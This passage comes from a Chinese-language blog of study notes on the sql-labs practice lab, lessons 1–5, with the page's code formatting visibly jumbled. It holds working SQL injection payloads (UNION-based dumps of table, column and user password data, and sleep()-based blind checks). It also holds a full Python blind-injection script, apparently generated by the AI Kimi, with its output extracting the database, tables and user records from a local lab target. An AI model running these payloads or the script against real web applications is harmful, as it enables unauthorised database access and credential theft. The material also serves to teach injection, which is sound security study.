<span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>--+<br></code></pre></td></tr></table></figure><p>在博客园和csdn有很多详细解释，只记下自己不明白去查询的点以防以后忘记</p><h3 id="我的新知识点"><a href="#我的新知识点" class="headerlink" title="我的新知识点"></a>我的新知识点</h3><p><strong>group_concat &#x2F;&#x2F;将查询到的表的数据结果拼接起来</strong></p><p><strong>union select &#x2F;&#x2F;联合查询，能将同时查询 1,2,3 个</strong></p><p><strong>information_schema &#x2F;&#x2F;在SQL中，INFORMATION_SCHEMA 是一个特殊的数据库，它存储了数据库管理系统（DBMS）的元数据信息。这些元数据包括数据库的结构、表的信息、列的定义、用户权限、存储过程等。</strong></p><p>INFORMATION_SCHEMA 提供了一种标准化的方式来访问数据库的元数据信息。它类似于一个“数据库的数据库”，帮助用户了解数据库的内部结构和配置。通过查询 INFORMATION_SCHEMA 中的表，用户可以获取以下信息：  </p><p>数据库中有哪些表（INFORMATION_SCHEMA.TABLES）。  </p><p>每个表有哪些列（INFORMATION_SCHEMA.COLUMNS）。</p><p>数据库的用户权限（INFORMATION_SCHEMA.USER_PRIVILEGES）。</p><p>数据库的字符集和校对规则（INFORMATION_SCHEMA.CHARACTER_SETS）。</p><p>存储过程和函数的定义（INFORMATION_SCHEMA.ROUTINES）。</p><p>数据库的表分区信息（INFORMATION_SCHEMA.PARTITIONS）。</p><p>数据库的外键约束信息（INFORMATION_SCHEMA.KEY_COLUMN_USAGE）。</p><p><em><strong>我看我目前用到的是下面：</strong></em></p><p>  (1) INFORMATION_SCHEMA.TABLES<br>用途：列出数据库中所有表的信息。<br>字段：<br>table_schema：表所属的数据库名称。<br>table_name：表的名称。<br>table_type：表的类型（如 BASE TABLE 或 VIEW）。<br>engine：表的存储引擎（如 InnoDB 或 MyISAM）。</p><p>(2) INFORMATION_SCHEMA.COLUMNS<br>用途：列出表中所有列的详细信息。<br>字段：<br>table_schema：表所属的数据库名称。<br>table_name：表的名称。<br>column_name：列的名称。<br>data_type：列的数据类型<br>character_maximum_length：列的最大长度。</p><p><em><strong>搭配 where 来使用</strong></em></p><p>回顾刚才的payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">?id=-1&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><h3 id="新知识点"><a href="#新知识点" class="headerlink" title="新知识点"></a>新知识点</h3><p><em><strong>数字型注入的sql语句</strong></em></p><p>后端代码 例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;selcet * from users where id=<span class="hljs-variable">$get_id</span>&quot;</span><br><br></code></pre></td></tr></table></figure><p>与字符型的区别是将用户输入内容：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$get</span>_id</span><br></code></pre></td></tr></table></figure><p>直接拼接到sql语句中。  </p><p>对比字符型sql语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$get_id&#x27;</span><br></code></pre></td></tr></table></figure><p>所以不需要使用 “ ‘ “ 来构建新的查询，也不需要 ‘#’ 或者 ‘–+’来将后面的语句注释掉，如果带密码则需要注释吧  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),version()<br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username ,id , <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<br><br><br><span class="hljs-comment">---</span><br>title: note<span class="hljs-number">-02</span><br><span class="hljs-type">date</span>: <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-27</span> <span class="hljs-number">18</span>:<span class="hljs-number">26</span>:<span class="hljs-number">18</span><br>tags: <span class="hljs-keyword">sql</span>-labs<br><span class="hljs-comment">---</span><br># <span class="hljs-keyword">sql</span>-labs less<span class="hljs-number">-3</span>  <br><br>传入：<br></code></pre></td></tr></table></figure><p>?id&#x3D;1’</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">回显<br>&gt;You have an error in your SQ<span class="hljs-class">L syntax;</span><span class="hljs-built_in"> check </span>the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;-1&#x27;&#x27;) LIMIT 0,1&#x27; at line 1<br><br>根据csdn和题目的提示，推测sql查询语句  <br></code></pre></td></tr></table></figure><p>select * from users where id&#x3D;(‘$id’)</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">所以当传入payload为<br></code></pre></td></tr></table></figure><p>?id&#x3D;1’) –+</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">整段<span class="hljs-keyword">sql</span>查询语句为：<br></code></pre></td></tr></table></figure><p>select * from users where $id&#x3D;(‘1’)–+)</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">如此一来成功闭合sql查询，后面就按流程走ok了<br><br><span class="hljs-section">## 新知识点</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*并和括号*</span>**</span>  <br></code></pre></td></tr></table></figure><p>select * from users where id&#x3D;(‘$id’)</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br><span class="hljs-meta"># sql-labs less-4</span><br><br>一开始也不知道有用双引号来构造的，然后还是看了csdn😅<br><br>传入：<br></code></pre></td></tr></table></figure><p>?id&#x3D;1”)</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">回显：<br><br>&gt; You have <span class="hljs-keyword">an</span> error <span class="hljs-keyword">in</span> your SQL syntax; check <span class="hljs-keyword">the</span> manual that corresponds <span class="hljs-built_in">to</span> your MySQL server <span class="hljs-built_in">version</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> syntax <span class="hljs-built_in">to</span> use near <span class="hljs-string">&#x27;&quot;) LIMIT 0,1&#x27;</span> <span class="hljs-keyword">at</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span> <br><br>  <br>推测后台sql语句：<br></code></pre></td></tr></table></figure><p>select * from users where id&#x3D;(“$id”)</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">  <br>后面的paylaod：<br><br></code></pre></td></tr></table></figure><p>?id&#x3D;-1”) union select 1,2,3 –+<br>?id&#x3D;-1”) union select 1,database(),3 –+<br>?id&#x3D;-1”) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+<br>?id&#x3D;-1”) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+<br>?id&#x3D;-1”) union select 1,database(),group_concat(id,username,password) from users–+</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 新知识点</span></span><br>***双引号***  <br><br>用双引号来 &quot; 来闭合语句<br><br><br><br><br>---<br>title: note-03<br>date: 2025-02-28 20:48:34<br>tags: sql-labs<br>---<br>&lt;style&gt;<br>pre &#123;<br>  overflow-y: auto;<br>  max-height: 300px;<br>&#125;<br>&lt;/style&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">sql-labs less5</span><br>输入payload  <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">?<span class="hljs-built_in">id</span>=1</span>  <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">?<span class="hljs-built_in">id</span>=2</span><br><br>回显<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">You are <span class="hljs-keyword">in</span>...........</span>  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">You are <span class="hljs-keyword">in</span>...........</span>  <br>  <br>视乎是没有回显。根据以前一点点ctf的经验，应该是布尔盲注了，没想到第五题就遇上了。  <br><br>尝试构建sql注入的paylaod  <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;</span></span>  <br><br>回显<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27; LIMIT 0,1&#x27;</span> at line 1</span>    <br><br>推测后端语句可能为  <br></code></pre></td></tr></table></figure><p>select * from users where id&#x3D;’$get_id’</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>然后看csdn<br><br>看到两种解法，经典的是基于时间的布尔盲注，新的是基于<span class="hljs-type">xml</span>报错回显的注入<br><br>##  布尔盲注<br>原理是用<span class="hljs-keyword">sql</span>中的  <br><br>&gt;<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>  <br><br>返回的布尔值（<span class="hljs-keyword">true</span>,<span class="hljs-keyword">false</span>）然后用<span class="hljs-keyword">if</span>()设置不同的反应，根据反应来判断布尔的值来判断注入查询的数据是否存在吧<br></code></pre></td></tr></table></figure><p>length函数用法<br>后端语句：<br>select length()； – 返回length里的字节或字符长度</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">length</span>函数：<br><br>KIMI：  <br></code></pre></td></tr></table></figure><p>MySQL：LENGTH 返回字节长度，CHAR_LENGTH 返回字符长度。<br>PostgreSQL：LENGTH 返回字符长度。<br>SQLite：LENGTH 返回字节长度。<br>SQL Server：LEN 返回字符长度。<br>Oracle：LENGTH 返回字节长度，LENGTHC 返回字符长度。</p><p>PostgreSQL&#x2F;SQLite&#x2F;Oracle：使用 CASE 语句。</p><p>SQL Server：使用 CASE 语句或 IF…ELSE 语句。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>sql中<span class="hljs-built_in">if</span>()语句的用法：  <br><br>KIMI：  <br><br></code></pre></td></tr></table></figure><p>MySQL：IF(expr, true_expr, false_expr)<br>SELECT IF(1 &gt; 0, ‘True’, ‘False’); – 返回 ‘True’<br>SELECT IF(1 &lt; 0, ‘True’, ‘False’); – 返回 ‘False’</p><p>PostgreSQL&#x2F;SQLite&#x2F;Oracle：使用 CASE 语句。</p><p>SQL Server：使用 CASE 语句或 IF…ELSE 语句。  </p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lasso">  <br>看csdn上，可以用length根据是否有You are <span class="hljs-keyword">in</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..来判断；  <br><br>也能用<span class="hljs-literal">and</span> <span class="hljs-keyword">if</span> sleep的时间延迟来判断；<br><br>根据前几题大概知道数据库名称为<span class="hljs-string">&#x27;security&#x27;</span>为<span class="hljs-number">8</span>个字符；  <br><br>payload：<br><br></code></pre></td></tr></table></figure><p>?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(5),1)–+  </p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><br>payload的逻辑是先用<span class="hljs-keyword">length</span>判断当前所在数据库的名字长度，<br>&gt;如果猜对为<span class="hljs-number">8</span>，则让回显延迟<span class="hljs-number">5</span>秒，此时因为使用了<span class="hljs-keyword">and</span>，<span class="hljs-keyword">and</span>的右边无法满足布尔值为真，所以不会有回显<br>什么也没有回显，说明猜测字符长度正确；<br><br>&gt;如果猜测错误，则会使得<span class="hljs-keyword">if</span>返回<span class="hljs-number">1</span>，让<span class="hljs-keyword">and</span>的两边满足全为真，使得服务器返回‘you are in......’<br><br>其中用到了<span class="hljs-keyword">if</span>函数和<span class="hljs-keyword">sleep</span>函数,  <br><span class="hljs-keyword">sleep</span>()函数是让回显延迟指定的时间吧；  <br><br>回到payload<br><br>按照我们设置的延迟可确认确实为<span class="hljs-number">8</span>个字符，也就是<span class="hljs-string">&#x27;security&#x27;</span><br><br>试了一下<br><br>id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(length(database())=&#x27;</span>security<span class="hljs-string">&#x27;,sleep(5),1)--+id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">length</span>(database())=<span class="hljs-string">&#x27;security&#x27;</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><br>问了kimi，原来是<span class="hljs-keyword">length</span>()函数只会返回整型数值，而我要用它来对比字符串😅  <br><br>**然后是<span class="hljs-keyword">substr</span>()函数**  <br><br></code></pre></td></tr></table></figure><p>SUBSTR(string, start, length)</p><p>string：原始字符串。<br>start：子字符串的起始位置（从 1 开始计数）。<br>length：要提取的子字符串的长度。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>ASCII(character_expression)</p><p>character_expression：可以是单个字符、字符串字面值或列名。该参数必须是字符类型（如 CHAR 或 VARCHAR）。</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">一定要转成<span class="hljs-keyword">ascii</span>吗？  <br>试了一下<br><br></code></pre></td></tr></table></figure><p>?id&#x3D;1’ and if(substr(database(),1,1)&#x3D;’s’,sleep(5),1)–+</p><p>?id&#x3D;1’ and if(substr(database(),1,8)&#x3D;’security’,sleep(5),1)–+</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">确实能直接猜测字符了!<br><br>如果有python脚本的话<span class="hljs-params">...</span><span class="hljs-params">...</span>  <br>k：有的兄弟，有的<br><br>KIMI：  <br><br></code></pre></td></tr></table></figure><p>import requests<br>&#x2F;&#x2F;配置<br>TARGET_URL &#x3D; “<a href="http://localhost:32768/Less-5/">http://localhost:32768/Less-5/</a>“  &#x2F;&#x2F; 目标URL<br>TRUE_STRING &#x3D; “You are in………..”  &#x2F;&#x2F; 数据库判断成功的响应标志<br>CHARSET &#x3D; “abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!”  &#x2F;&#x2F; 测试字符集<br>HEADERS &#x3D; {<br>    “User-Agent”: “Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;58.0.3029.110 Safari&#x2F;537.3”<br>}</p><p>&#x2F;&#x2F;发送请求<br>def send_payload(payload):<br>    url &#x3D; f”{TARGET_URL}?id&#x3D;1’ AND {payload} –+”<br>    response &#x3D; requests.get(url, headers&#x3D;HEADERS)<br>    return response.text<br>&#x2F;&#x2F; 获取长度<br>def get_length(query):<br>    length &#x3D; 0<br>    while True:<br>        payload &#x3D; f”LENGTH({query})&#x3D;{length}”<br>        response &#x3D; send_payload(payload)<br>        if TRUE_STRING in response:<br>            print(f”[+] 长度为: {length}”)<br>            return length<br>        length +&#x3D; 1<br>&#x2F;&#x2F; 逐字符获取字符串<br>def get_string(query, length):<br>    result &#x3D; “”<br>    for i in range(1, length + 1):<br>        print(f”[+] 获取第 {i} 个字符…”)<br>        for char in CHARSET:<br>            payload &#x3D; f”SUBSTR({query},{i},1)&#x3D;’{char}’”<br>            response &#x3D; send_payload(payload)<br>            if TRUE_STRING in response:<br>                result +&#x3D; char<br>                print(f”[+] 当前结果: {result}”)<br>                break<br>    return result</p><p>&#x2F;&#x2F; 主函数<br>def main():<br>    &#x2F;&#x2F; 获取数据库名<br>    db_length &#x3D; get_length(“DATABASE()”)<br>    db_name &#x3D; get_string(“DATABASE()”, db_length)<br>    print(f”[+] 数据库名: {db_name}”)</p><pre><code class="hljs">// 获取表名table_count = 0while True:    payload = f&quot;(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=&#123;table_count&#125;&quot;    response = send_payload(payload)    if TRUE_STRING in response:        break    table_count += 1print(f&quot;[+] 表数量: &#123;table_count&#125;&quot;)// 获取所有表名table_names = []for i in range(table_count):    tbl_length = get_length(f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;)    tbl_name = get_string(f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;, tbl_length)    table_names.append(tbl_name)    print(f&quot;[+] 表名: &#123;tbl_name&#125;&quot;)// 获取字段名（以users表为例）target_table = &quot;users&quot;  // 替换为目标表名print(f&quot;[+] 获取&#123;target_table&#125;表的字段...&quot;)field_count = 0while True:    payload = f&quot;(SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#39;&#123;target_table&#125;&#39; AND table_schema=DATABASE())=&#123;field_count&#125;&quot;    response = send_payload(payload)    if TRUE_STRING in response:        break    field_count += 1print(f&quot;[+] 字段数量: &#123;field_count&#125;&quot;)// 获取字段名field_names = []for i in range(field_count):    fld_length = get_length(f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#39;&#123;target_table&#125;&#39; AND table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;)    fld_name = get_string(f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#39;&#123;target_table&#125;&#39; AND table_schema=DATABASE() LIMIT &#123;i&#125;,1)&quot;, fld_length)    field_names.append(fld_name)    print(f&quot;[+] 字段名: &#123;fld_name&#125;&quot;)// 获取数据print(f&quot;[+] 获取&#123;target_table&#125;表的数据...&quot;)for i in range(field_count):    if field_names[i] in [&quot;username&quot;, &quot;password&quot;]:  // 获取用户名和密码字段        print(f&quot;[+] 获取字段: &#123;field_names[i]&#125;&quot;)        data_count = 0        while True:            payload = f&quot;(SELECT COUNT(*) FROM &#123;target_table&#125;)=&#123;data_count&#125;&quot;            response = send_payload(payload)            if TRUE_STRING in response:                break            data_count += 1        print(f&quot;[+] 数据条数: &#123;data_count&#125;&quot;)        for j in range(data_count):            data_length = get_length(f&quot;(SELECT &#123;field_names[i]&#125; FROM &#123;target_table&#125; LIMIT &#123;j&#125;,1)&quot;)            data = get_string(f&quot;(SELECT &#123;field_names[i]&#125; FROM &#123;target_table&#125; LIMIT &#123;j&#125;,1)&quot;, data_length)            print(f&quot;[+] 数据[&#123;j+1&#125;]: &#123;data&#125;&quot;)</code></pre><p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>    main()</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos"><br>这是直接猜测字符而不猜测其<span class="hljs-keyword">ascii</span>码的    <br>改了一下  <br></code></pre></td></tr></table></figure><p>sr &#x3D; string.printable<br>CHARSET &#x3D; sr  &#x2F;&#x2F;“abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!”  &#x2F;&#x2F; 测试字符集</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">因为我也不敢确定ai给出的字符是完整且编码正确的  <br><br>恕我只是个脚本小子，能学懂原理先吧  <br><br>运行结果<br></code></pre></td></tr></table></figure><p>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: s<br>[+] 获取第 2 个字符…<br>[+] 当前结果: se<br>[+] 获取第 3 个字符…<br>[+] 当前结果: sec<br>[+] 获取第 4 个字符…<br>[+] 当前结果: secu<br>[+] 获取第 5 个字符…<br>[+] 当前结果: secur<br>[+] 获取第 6 个字符…<br>[+] 当前结果: securi<br>[+] 获取第 7 个字符…<br>[+] 当前结果: securit<br>[+] 获取第 8 个字符…<br>[+] 当前结果: security<br>[+] 数据库名: security<br>[+] 表数量: 4<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: e<br>[+] 获取第 2 个字符…<br>[+] 当前结果: em<br>[+] 获取第 3 个字符…<br>[+] 当前结果: ema<br>[+] 获取第 4 个字符…<br>[+] 当前结果: emai<br>[+] 获取第 5 个字符…<br>[+] 当前结果: email<br>[+] 获取第 6 个字符…<br>[+] 当前结果: emails<br>[+] 表名: emails<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: r<br>[+] 获取第 2 个字符…<br>[+] 当前结果: re<br>[+] 获取第 3 个字符…<br>[+] 当前结果: ref<br>[+] 获取第 4 个字符…<br>[+] 当前结果: refe<br>[+] 获取第 5 个字符…<br>[+] 当前结果: refer<br>[+] 获取第 6 个字符…<br>[+] 当前结果: refere<br>[+] 获取第 7 个字符…<br>[+] 当前结果: referer<br>[+] 获取第 8 个字符…<br>[+] 当前结果: referers<br>[+] 表名: referers<br>[+] 长度为: 7<br>[+] 获取第 1 个字符…<br>[+] 当前结果: u<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ua<br>[+] 获取第 3 个字符…<br>[+] 当前结果: uag<br>[+] 获取第 4 个字符…<br>[+] 当前结果: uage<br>[+] 获取第 5 个字符…<br>[+] 当前结果: uagen<br>[+] 获取第 6 个字符…<br>[+] 当前结果: uagent<br>[+] 获取第 7 个字符…<br>[+] 当前结果: uagents<br>[+] 表名: uagents<br>[+] 长度为: 5<br>[+] 获取第 1 个字符…<br>[+] 当前结果: u<br>[+] 获取第 2 个字符…<br>[+] 当前结果: us<br>[+] 获取第 3 个字符…<br>[+] 当前结果: use<br>[+] 获取第 4 个字符…<br>[+] 当前结果: user<br>[+] 获取第 5 个字符…<br>[+] 当前结果: users<br>[+] 表名: users<br>[+] 获取users表的字段…<br>[+] 字段数量: 3<br>[+] 长度为: 2<br>[+] 获取第 1 个字符…<br>[+] 当前结果: i<br>[+] 获取第 2 个字符…<br>[+] 当前结果: id<br>[+] 字段名: id<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: u<br>[+] 获取第 2 个字符…<br>[+] 当前结果: us<br>[+] 获取第 3 个字符…<br>[+] 当前结果: use<br>[+] 获取第 4 个字符…<br>[+] 当前结果: user<br>[+] 获取第 5 个字符…<br>[+] 当前结果: usern<br>[+] 获取第 6 个字符…<br>[+] 当前结果: userna<br>[+] 获取第 7 个字符…<br>[+] 当前结果: usernam<br>[+] 获取第 8 个字符…<br>[+] 当前结果: username<br>[+] 字段名: username<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: p<br>[+] 获取第 2 个字符…<br>[+] 当前结果: pa<br>[+] 获取第 3 个字符…<br>[+] 当前结果: pas<br>[+] 获取第 4 个字符…<br>[+] 当前结果: pass<br>[+] 获取第 5 个字符…<br>[+] 当前结果: passw<br>[+] 获取第 6 个字符…<br>[+] 当前结果: passwo<br>[+] 获取第 7 个字符…<br>[+] 当前结果: passwor<br>[+] 获取第 8 个字符…<br>[+] 当前结果: password<br>[+] 字段名: password<br>[+] 获取users表的数据…<br>[+] 获取字段: username<br>[+] 数据条数: 13<br>[+] 长度为: 4<br>[+] 获取第 1 个字符…<br>[+] 当前结果: d<br>[+] 获取第 2 个字符…<br>[+] 当前结果: du<br>[+] 获取第 3 个字符…<br>[+] 当前结果: dum<br>[+] 获取第 4 个字符…<br>[+] 当前结果: dumb<br>[+] 数据[1]: dumb<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: an<br>[+] 获取第 3 个字符…<br>[+] 当前结果: ang<br>[+] 获取第 4 个字符…<br>[+] 当前结果: ange<br>[+] 获取第 5 个字符…<br>[+] 当前结果: angel<br>[+] 获取第 6 个字符…<br>[+] 当前结果: 